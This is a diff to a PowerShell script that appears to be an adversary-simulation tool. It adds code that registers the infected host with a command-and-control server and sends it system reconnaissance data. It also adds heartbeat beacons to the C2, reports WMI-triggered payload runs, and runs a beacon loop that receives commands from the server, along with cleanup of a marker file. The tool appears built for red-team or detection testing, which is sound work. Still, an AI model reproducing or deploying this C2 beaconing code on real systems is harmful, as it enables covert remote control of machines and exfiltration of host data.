@@ -205,6 +205,44 @@ function Send-Beacon {
     }
 }
 
+# Register the session once with the C2 and store the returned session id
+function Register-Session {
+    param(
+        [hashtable]$Recon
+    )
+    Write-Host "[*] Registering session with C2..." -ForegroundColor Cyan
+    try {
+        $resp = Send-Beacon -Data $Recon -Endpoint "/register"
+        if ($resp -and $resp.session_id) {
+            $Global:RegisteredSessionId = $resp.session_id
+            Write-Host "    [OK] Registered session id: $Global:RegisteredSessionId" -ForegroundColor Green
+        }
+        else {
+            $Global:RegisteredSessionId = $Global:UniqueId
+            Write-Warning "    [!] Registration did not return session_id; using local id $Global:RegisteredSessionId"
+        }
+        return $resp
+    }
+    catch {
+        Write-Warning "    [!] Registration failed: $($_.Exception.Message)"
+        $Global:RegisteredSessionId = $Global:UniqueId
+        return $null
+    }
+}
+
+# Send a heartbeat event to the C2 (/heartbeat). Ensures SessionId and Timestamp.
+function Send-Heartbeat {
+    param(
+        [hashtable]$Data
+    )
+    if (-not $Data) { $Data = @{} }
+    if (-not $Data.SessionId) {
+        if ($Global:RegisteredSessionId) { $Data.SessionId = $Global:RegisteredSessionId } else { $Data.SessionId = $Global:UniqueId }
+    }
+    if (-not $Data.Timestamp) { $Data.Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss") }
+    return Send-Beacon -Data $Data -Endpoint "/heartbeat"
+}
+
 # ==========================================================================
 # TECHNIQUE 3: IN-MEMORY CODE EXECUTION
 # ==========================================================================
@@ -312,10 +350,27 @@ function Set-EnvPayload {
 
 # Helper used by session/event actions to run the demo payload
 function Invoke-WmiPayloadAction {
+    param(
+        [string]$Trigger = "ProcessStart"
+    )
     try {
-        Invoke-RestMethod -Uri "$Global:C2Url/?message=how-are-you-session=$($Global:UniqueId)" -Method Get -ErrorAction SilentlyContinue
+        $sessionId = $Global:RegisteredSessionId
+        if (-not $sessionId) { $sessionId = $Global:UniqueId }
+
+        $eventData = @{
+            SessionId = $sessionId
+            Iteration = 0
+            Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+            Status = "WMIAction"
+            Event = "WMITriggered"
+            Trigger = $Trigger
+        }
+
+        # Report to C2 using heartbeat endpoint (server stores raw data)
+        try { Send-Heartbeat -Data $eventData | Out-Null } catch {}
+
         $desktop = [Environment]::GetFolderPath('Desktop')
-        Add-Content -Path (Join-Path $desktop 'calcLOG.txt') -Value "Executed payload at $(Get-Date -Format o) by session $($Global:UniqueId)" -ErrorAction SilentlyContinue
+        Add-Content -Path (Join-Path $desktop 'calcLOG.txt') -Value "Executed payload at $(Get-Date -Format o) by session $sessionId (trigger: $Trigger)" -ErrorAction SilentlyContinue
     } catch { }
 }
 
@@ -452,6 +507,21 @@ function Undo-LiveChanges {
     }
     else {
         Write-Host "    [*] Desktop file not found: $desktopFile" -ForegroundColor Gray
+    }
+
+    # Remove calc log if present (created by WMI/poller)
+    $calcLog = Join-Path -Path $desktopPath -ChildPath 'calcLOG.txt'
+    if (Test-Path -Path $calcLog) {
+        try {
+            Remove-Item -Path $calcLog -Force -ErrorAction Stop
+            Write-Host "    [OK] Removed desktop calc log: $calcLog" -ForegroundColor Green
+        }
+        catch {
+            Write-Error "    [!] Failed to remove calc log file: $($_.Exception.Message)"
+        }
+    }
+    else {
+        Write-Host "    [*] calc log not found: $calcLog" -ForegroundColor Gray
     }
 
     # Remove file if exists
@@ -873,14 +943,17 @@ function Start-BeaconLoop {
         $iteration++
         Write-Host "[Beacon $iteration] $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor DarkCyan
         
+        $sessionId = $Global:RegisteredSessionId
+        if (-not $sessionId) { $sessionId = $Global:UniqueId }
+
         $beaconData = @{
-            SessionId = $Global:UniqueId
+            SessionId = $sessionId
             Iteration = $iteration
             Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
             Status = "Active"
         }
-        
-        $response = Send-Beacon -Data $beaconData -Endpoint "/register"
+
+        $response = Send-Heartbeat -Data $beaconData
         
         if ($response -and $response.command) {
             Write-Host "    [!] Received command from C2: $($response.command)" -ForegroundColor Magenta
@@ -906,6 +979,10 @@ function Start-Simulation {
     # Run Reconnaissance (always runs)
     $reconData = Get-SystemRecon
     Write-Host ""
+    # Register with C2 once (only in Live Mode)
+    if (-not $Global:DemoMode) {
+        Register-Session -Recon $reconData | Out-Null
+    }
     
     # Execute techniques
     Invoke-MemoryExecution
